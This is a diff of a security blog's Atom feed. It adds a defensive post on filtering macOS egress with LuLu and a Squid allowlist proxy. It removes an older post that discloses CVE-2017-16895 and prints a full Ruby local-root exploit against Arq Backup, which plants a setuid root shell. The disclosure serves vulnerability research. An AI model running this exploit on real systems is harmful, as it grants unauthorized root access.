@@ -6,7 +6,101 @@
   </author>
   <id>http://m4.rkw.io/blog/</id>
   <title>m4.rkw.io</title>
-  <updated>2022-02-10T06:24:52+00:00</updated>
+  <updated>2022-02-10T21:32:53+00:00</updated>
+  <entry>
+    <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
+    <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
+    <summary>&lt;pre&gt;Egress filtering is an immensely powerful security control but it&amp;#39;s not so
+straightforward to do it well. If any malware manages to execute on your system
+one of the first things it&amp;#39;s likely going to try to do is call home and
+establish a C2 channel. With effective egress filtering you can break this link
+in the attack chain and stop it dead in its tracks.
+
+There are two well-known products which do egress filtering on macs - Little
+Snitch and LuLu. LuLu is made available by the awesome Patrick Wardle on his
+website - &lt;a href=&quot;https://objective-see.com - along with a load of other very clever&quot;&gt;https://objective-see.com - along with a load of other very clever&lt;/a&gt;
+security tools.
+
+This post is mostly going to discuss LuLu but the approach taken here may well
+work just as well with Little Snitch. LuLu is free and very cleverly made, it
+even allows you to configure regexes for web urls that applications are allowed
+to connect to. It does have one major limitation imposed by the operating
+system though which is mentioned on the website:
+
+&amp;quot;Due to limitations of macOS, blocking via host name is only applicable to (as
+Apple notes) &amp;quot;Network.framework or NSURLSession connections&amp;quot;. 
+
+As such, for browsers (such as Chrome), that do not leverage these frameworks,
+only ip address based blocking is supported.&amp;quot;
+
+So what this means is that you will often get LuLu popups for connections with
+only IPs specified. This isn&amp;#39;t ideal because the endpoints being connected to
+will often change IPs so if you simply add rules based on the IPs you&amp;#39;ll be
+forever plagued with popups whenever they change, and so because of this the
+tendency is to simply allow *:443 or similar to avoid endless popups. This is
+bad because you&amp;#39;re granting more egress to the application than would
+otherwise be ideal.
+
+There is however a way you can make this a lot letter and that&amp;#39;s by using an
+http proxy to filtering the outbound requests. One such proxy product is Squid
+which is freely available via Homebrew or Macports. If you can force
+applications to connect through squid instead of directly you can have proper
+control over what hosts they can connect to using hostnames even if the
+applications themselves don&amp;#39;t use the Network or NSURLSession frameworks.
+
+The first thing to determine is what stuff you can force over the proxy. Good
+candidates for this are anything that you run from the terminal - curl,
+terraform, python, anything like this can be configured to connect to an http
+proxy. Most terminal apps will respect the environment variables https_proxy or
+HTTPS_PROXY so these can simply be set in your bash config.
+
+Next we need Squid installed via either brew or macports, if you&amp;#39;re using brew
+be aware that it install everything with file ownership as the local user so you
+won&amp;#39;t want launchd invoking the squid binary as root. Obviously squid will need
+LuLu rules allowing it to make outbound connections, I&amp;#39;d suggest allowing ports
+80 and 443 outbound to all addresses at a minimum.
+
+Then we want a simple allowlist config for squid:
+
+acl allowlist dstdom_regex &amp;#39;/etc/squid/allowlist.txt&amp;#39;
+http_access allow allowlist
+http_access deny all
+dns_v4_first on
+query_icmp off
+
+We can put hostname regexes into allowlist.txt and these will be allowed by the
+proxy.
+
+LuLu won&amp;#39;t filter any connections to localhost so the ruleset for your
+applications that can talk to the proxy can be very simple - allow DNS and
+nothing else. I like to create two rules in Lulu for all applications, one to
+allow DNS and one to block all other traffic. Any rules created that allow
+connections will override the default block-everything rule, and this way if a
+connection is denied it&amp;#39;s simply denied - no annoying popups.
+
+Once this is set up you can simply tail the Squid access log to see what stuff
+is being connected to, anything that isn&amp;#39;t in the allowlist.txt will return a
+403 and you can edit the list and restart squid if you need to.
+
+It&amp;#39;s even possible to control access to github using this approach. Github is
+annoying in that its IPs change almost by the second, making filtering
+connections to it with LuLu practically impossible without simply allowing all
+traffic on tcp/22. However using this squid approach and socat we can route all
+ssh connections to github over the proxy:
+
+Host github.com
+  User git
+  Port 22
+  Hostname github.com
+  ProxyCommand socat - PROXY:localhost:%h:%p,proxyport=3128
+
+Lulu is an excellent product but the limitations of the OS hold it back, by
+integrating it with a local http proxy we can get much more control over what
+connections go out of the system.&lt;/pre&gt;</summary>
+    <title>Restricting macOS egress with LuLu and Squid proxy</title>
+    <updated>2022-02-10T20:55:46+00:00</updated>
+    <dc:date>2022-02-10T20:55:46+00:00</dc:date>
+  </entry>
   <entry>
     <id>http://m4.rkw.io/blog/getting-back-into-blogging.html</id>
     <link href="http://m4.rkw.io/blog/getting-back-into-blogging.html"/>
@@ -2357,101 +2451,5 @@ malware so that they can escalate opportunistically.&lt;/pre&gt;</summary>
     <updated>2017-11-29T21:04:29+00:00</updated>
     <dc:date>2017-11-29T21:04:29+00:00</dc:date>
   </entry>
-  <entry>
-    <id>http://m4.rkw.io/blog/cve201716895-local-root-privesc-in-arq-backup--597.html</id>
-    <link href="http://m4.rkw.io/blog/cve201716895-local-root-privesc-in-arq-backup--597.html"/>
-    <summary>&lt;pre&gt;As well as the other bugs affecting Arq &amp;lt;= 5.9.6 there is also another issue
-with the suid-root restorer binaries in Arq for Mac. There are three of them
-and they are used to execute restores of backed up files from the various
-cloud providers.
-
-After reversing the inter-app protocol I discovered that the path to the
-restorer binary was specified as part of the data packet sent by the UI. After
-receiving this, the restorer binaries then set +s and root ownership on this
-path. This means we can specify an arbitrary path which will receive +s and root
-ownership.
-
-This issue is fixed in Arq 5.10.
-
-&lt;a href=&quot;https://m4.rkw.io/arq_5.9.7.rb.txt&quot;&gt;https://m4.rkw.io/arq_5.9.7.rb.txt&lt;/a&gt;
-b274aed5fabfe5e1ed7ff14cc6f0ff20f645ecfe0ec329b23cd7410a3cf990a6
-----------------------------------------------------------------------------
-#!/usr/bin/env ruby
-
-##################################################################
-###### Arq &amp;lt;= 5.9.7 local root privilege escalation exploit ######
-###### by m4rkw - &lt;a href=&quot;https://m4.rkw.io/blog.html&quot;&gt;https://m4.rkw.io/blog.html&lt;/a&gt;               ######
-##################################################################
-
-s = File.stat(&amp;quot;/Applications/Arq.app/Contents/Resources/standardrestorer&amp;quot;)
-
-if s.mode != 0104755 or s.uid != 0
-  puts &amp;quot;Not vulnerable - standardrestorer is not suid root.&amp;quot;
-  exit 1
-end
-
-binary_target = &amp;quot;/tmp/arq_597_exp&amp;quot;
-
-d = &amp;quot;\x01\x00\x00\x00\x00\x00\x00\x00&amp;quot;
-e = &amp;quot;\x00\x00\x00\x00\x03&amp;quot;
-z = &amp;quot;0000&amp;quot;
-target = sprintf(&amp;quot;%s%s-%s-%s-%s-%s%s%s&amp;quot;, z,z,z,z,z,z,z,z)
-plist = &amp;quot;&amp;lt;plist version=\&amp;quot;1.0\&amp;quot;&amp;gt;&amp;lt;dict&amp;gt;&amp;lt;\/dict&amp;gt;&amp;lt;\/plist&amp;gt;&amp;quot;
-backup_set = &amp;quot;0&amp;quot; * 40
-hmac = &amp;quot;0&amp;quot; * 40
-
-payload = sprintf(
-  &amp;quot;%s%s%s%s\$%s%s\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00&amp;quot; +
-  &amp;quot;\x00\x00\x00\x00\x00\x09\x00\x00\x02\xd0\x96\x82\xef\xd8\x00\x00\x00\x00&amp;quot; +
-  &amp;quot;\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x08\x30\x2e\x30&amp;quot; +
-  &amp;quot;\x30\x30\x30\x30\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&amp;quot; +
-  &amp;quot;\x00\x00\x00\x00\x00\x00\x00%s%s%s\x28%s\x01\x00\x00\x00%s\x00\x00\x00%s&amp;quot; +
-  &amp;quot;\x00\x00\x00\x00\x16\x00\x00\x00\x02%s\x28%s\x01\x00\x00\x00%s\x00\x00&amp;quot; +
-  &amp;quot;\x00%s\x00\x00\x00\x00\x00\x00\x00\x01\xf5\x00\x00\x00\x00\x00\x00\x00&amp;quot; +
-  &amp;quot;\x14\x00%s\x00\x00\x00\x00\x03%s\x0a&amp;quot;,
-    d, binary_target.length.chr, binary_target,
-    d, target,
-    d, plist.length.chr, plist,
-    d, backup_set,
-    d, d, d, hmac,
-    d, d, d, e * 10
-  )
-
-shellcode = &amp;quot;#include &amp;lt;unistd.h&amp;gt;\nint main()\n{ setuid(0);setgid(0);&amp;quot;+
-  &amp;quot;execl(\&amp;quot;/bin/bash\&amp;quot;,\&amp;quot;bash\&amp;quot;,\&amp;quot;-c\&amp;quot;,\&amp;quot;rm -f #{binary_target};/bin/bash\&amp;quot;,&amp;quot;+
-  &amp;quot;NULL);return 0; }&amp;quot;
-
-IO.popen(&amp;quot;gcc -xc -o #{binary_target} -&amp;quot;, mode=&amp;quot;r+&amp;quot;) do |io|
-  io.write(shellcode)
-  io.close
-end
-
-IO.popen(&amp;quot;/Applications/Arq.app/Contents/Resources/standardrestorer &amp;quot; +
-  &amp;quot;2&amp;gt;/dev/null&amp;quot;, mode=&amp;quot;r+&amp;quot;) do |io|
-  io.getc &amp;amp;&amp;amp; io.write(payload)
-end
-
-timeout=3
-i=0
-
-while (s = File.stat(binary_target)) &amp;amp;&amp;amp; (s.mode != 0104755 or s.uid != 0)
-  sleep 0.1
-  i += 1
-
-  if i &amp;gt;= (timeout * 10)
-    break
-  end
-end
-
-if s.mode == 0104755 and s.uid == 0
-  system(binary_target)
-  exit 0
-end
-
-puts &amp;quot;exploit failed&amp;quot;&lt;/pre&gt;</summary>
-    <title>CVE-2017-16895 Local root privesc in Arq Backup &lt;= 5.9.7</title>
-    <updated>2017-11-29T19:09:43+00:00</updated>
-    <dc:date>2017-11-29T19:09:43+00:00</dc:date>
-  </entry>
-  <dc:date>2022-02-10T06:24:52+00:00</dc:date>
+  <dc:date>2022-02-10T21:32:53+00:00</dc:date>
 </feed>
